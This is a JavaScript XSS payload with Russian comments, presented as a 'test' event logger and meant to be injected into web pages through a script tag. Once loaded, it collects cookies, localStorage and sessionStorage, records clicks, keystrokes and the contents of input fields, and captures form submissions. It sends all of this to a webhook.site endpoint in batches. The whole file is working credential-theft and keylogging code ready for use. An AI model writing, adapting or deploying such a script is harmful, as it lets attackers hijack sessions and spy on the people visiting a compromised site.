// XSS тестовый скрипт с логированием событий
// Используйте: <script src="https://raw.githubusercontent.com/Piplle/Kek/main/test.js"></script>

(function() {
  'use strict';
  
  console.log('XSS Event Logger активирован!');
  
  // URL для отправки логов
  var webhookUrl = 'https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972';
  
  // Массив для хранения событий
  var eventsLog = [];
  var maxEventsInBatch = 10; // Отправляем пачками по 10 событий
  var sendInterval = 5000; // Отправляем каждые 5 секунд
  
  // Функция для отправки логов на webhook.site
  function sendLogs(logs) {
    if (!logs || logs.length === 0) return;
    
    var logData = {
      type: 'events_batch',
      timestamp: new Date().toISOString(),
      url: window.location.href,
      events: logs,
      cookies: document.cookie
    };
    
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(logData)
    })
    .then(function(response) {
      console.log('Логи отправлены:', logs.length, 'событий');
    })
    .catch(function(error) {
      console.error('Ошибка отправки логов:', error);
    });
  }
  
  // Функция для логирования события
  function logEvent(eventType, eventData) {
    var logEntry = {
      type: eventType,
      timestamp: new Date().toISOString(),
      url: window.location.href,
      data: eventData
    };
    
    eventsLog.push(logEntry);
    console.log('Событие залогировано:', eventType, eventData);
    
    // Отправляем если накопилось достаточно событий
    if (eventsLog.length >= maxEventsInBatch) {
      sendLogs(eventsLog.splice(0, maxEventsInBatch));
    }
  }
  
  // Отправка начальной информации о странице
  function sendInitialData() {
    var initialData = {
      type: 'initial',
      timestamp: new Date().toISOString(),
      url: window.location.href,
      title: document.title,
      cookies: document.cookie,
      userAgent: navigator.userAgent,
      localStorage: {},
      sessionStorage: {},
      referrer: document.referrer
    };
    
    // Собираем localStorage
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        initialData.localStorage[key] = localStorage.getItem(key);
      }
    } catch(e) {
      initialData.localStorage = {error: 'Нет доступа'};
    }
    
    // Собираем sessionStorage
    try {
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        initialData.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch(e) {
      initialData.sessionStorage = {error: 'Нет доступа'};
    }
    
    sendLogs([initialData]);
  }
  
  // Перехват событий клика
  document.addEventListener('click', function(e) {
    var target = e.target;
    logEvent('click', {
      tag: target.tagName,
      id: target.id || null,
      className: target.className || null,
      text: target.textContent ? target.textContent.substring(0, 100) : null,
      href: target.href || null,
      x: e.clientX,
      y: e.clientY
    });
  }, true);
  
  // Перехват событий клавиатуры (только на формах и важных элементах)
  document.addEventListener('keydown', function(e) {
    var target = e.target;
    // Логируем только если это поле ввода
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable) {
      logEvent('keydown', {
        tag: target.tagName,
        id: target.id || null,
        className: target.className || null,
        key: e.key,
        keyCode: e.keyCode,
        value: target.value ? target.value.substring(0, 50) : null // Первые 50 символов
      });
    }
  }, true);
  
  // Перехват отправки форм
  document.addEventListener('submit', function(e) {
    var form = e.target;
    var formData = {};
    
    if (form.tagName === 'FORM') {
      var inputs = form.querySelectorAll('input, textarea, select');
      for (var i = 0; i < inputs.length; i++) {
        var input = inputs[i];
        if (input.name && input.type !== 'password') { // Не логируем пароли полностью
          formData[input.name] = input.value ? input.value.substring(0, 100) : '';
        } else if (input.name && input.type === 'password') {
          formData[input.name] = '***' + (input.value ? input.value.length : 0) + ' символов';
        }
      }
      
      logEvent('form_submit', {
        action: form.action || null,
        method: form.method || 'GET',
        formData: formData
      });
    }
  }, true);
  
  // Перехват изменения полей ввода
  document.addEventListener('change', function(e) {
    var target = e.target;
    if (target.tagName === 'INPUT' || target.tagName === 'SELECT' || target.tagName === 'TEXTAREA') {
      logEvent('input_change', {
        tag: target.tagName,
        id: target.id || null,
        name: target.name || null,
        type: target.type || null,
        value: target.value ? target.value.substring(0, 100) : null
      });
    }
  }, true);
  
  // Перехват изменения URL (SPA навигация)
  window.addEventListener('popstate', function(e) {
    logEvent('navigation', {
      url: window.location.href,
      type: 'popstate'
    });
  });
  
  window.addEventListener('hashchange', function(e) {
    logEvent('navigation', {
      url: window.location.href,
      type: 'hashchange'
    });
  });
  
  // Перехват перед уходом со страницы
  window.addEventListener('beforeunload', function(e) {
    // Отправляем оставшиеся события
    if (eventsLog.length > 0) {
      sendLogs(eventsLog.splice(0));
    }
  });
  
  // Периодическая отправка накопленных событий
  setInterval(function() {
    if (eventsLog.length > 0) {
      sendLogs(eventsLog.splice(0, maxEventsInBatch));
    }
  }, sendInterval);
  
  // Отправка начальных данных
  sendInitialData();
  
  console.log('Event Logger настроен и работает!');
  
})();


